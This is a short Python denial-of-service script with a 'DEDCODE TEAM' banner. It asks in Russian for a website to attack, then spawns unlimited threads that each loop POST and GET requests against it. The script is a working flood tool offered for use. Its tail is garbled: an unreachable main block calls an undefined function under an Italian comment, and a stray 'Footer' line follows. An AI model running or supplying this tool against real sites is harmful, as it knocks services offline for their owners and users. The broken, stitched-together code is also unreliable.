import threading
import requests
import random

print("🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼")

targ = input("Введите ссылку на сайт для атаки: ")

def dos():
 while True:
  requests.post(targ)
  requests.get(targ)
  print("[+] Заход на сайт выполнен!")
  
while True:
 threading.Thread(target=dos).start()

if __name__ == '__main__':
	starturl() # questo fa startare la prima funzione del programma, che a sua volta ne starta un altra, poi un altra, fino ad arrivare all'attacco.
Footer
